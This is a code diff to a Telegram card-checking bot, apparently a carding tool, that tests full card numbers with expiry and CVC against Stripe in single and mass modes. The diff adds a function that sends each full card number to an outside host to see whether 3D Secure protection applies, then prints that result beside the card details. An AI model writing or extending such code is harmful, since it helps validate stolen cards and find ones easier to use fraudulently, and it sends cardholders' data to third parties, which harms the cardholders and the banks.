@@ -119,7 +119,21 @@ async def get_bin_info(bin_number):
         'bank': 'N/A'
     }
 
-def format_card_response(card_data, is_approved, response_msg, bin_info, req_by, time_taken):
+async def get_vbv_info(cc_number):
+    """Get VBV (3D Secure) information from API"""
+    try:
+        timeout = aiohttp.ClientTimeout(total=10)
+        async with aiohttp.ClientSession(timeout=timeout) as session:
+            url = f"https://ronak.xyz/vbv.php?cc={cc_number}"
+            async with session.get(url) as response:
+                if response.status == 200:
+                    text = await response.text()
+                    return text.strip() if text else 'N/A'
+    except Exception:
+        pass
+    return 'N/A'
+
+def format_card_response(card_data, is_approved, response_msg, bin_info, req_by, time_taken, vbv_info='N/A'):
     """Format card check response"""
     card_display = f"{card_data['number']}|{card_data['exp_month']}|{card_data['exp_year']}|{card_data['cvc']}"
     
@@ -135,12 +149,15 @@ def format_card_response(card_data, is_approved, response_msg, bin_info, req_by,
     response_msg_escaped = html.escape(response_msg)
     req_by_escaped = html.escape(req_by)
     
+    vbv_info_escaped = html.escape(vbv_info) if vbv_info else 'N/A'
+    
     message = f"""み ¡@TOjiCHKBot ↯ ↝ 𝙍𝙚𝙨𝙪𝙡𝙩
 Stripe Auth
 ━━━━━━━━━
 𝐂𝐂 ➜ <code>{card_display_escaped}</code>
 𝐒𝐓𝐀𝐓𝐔𝐒 ➜ {status}
 𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ➜ {response_msg_escaped}
+𝑽𝑩𝑽  ➜ {vbv_info_escaped}
 ━━━━━━━━━
 𝐁𝐈𝐍 ➜ {bin_number_escaped}
 𝐓𝐘𝐏𝐄 ➜ {html.escape(bin_info.get('type', 'N/A'))}
@@ -726,6 +743,7 @@ async def chk_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     start_time = time.time()
     
     bin_info = await get_bin_info(card_data['number'][:6])
+    vbv_info = await get_vbv_info(card_data['number'])
     
     config = config_manager.get_config()
     stripe_url = config.stripe_url
@@ -758,7 +776,8 @@ async def chk_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         response_msg, 
         bin_info, 
         req_by, 
-        time_taken
+        time_taken,
+        vbv_info
     )
     
     await processing_msg.edit_text(formatted_response, parse_mode='HTML')
@@ -825,6 +844,7 @@ async def mchk_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         start_time = time.time()
         
         bin_info = await get_bin_info(card_data['number'][:6])
+        vbv_info = await get_vbv_info(card_data['number'])
         
         is_approved, response_msg = await process_stripe_card(
             stripe_url,
@@ -844,7 +864,8 @@ async def mchk_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
             response_msg,
             bin_info,
             req_by,
-            time_taken
+            time_taken,
+            vbv_info
         )
         
         results.append(formatted_response)
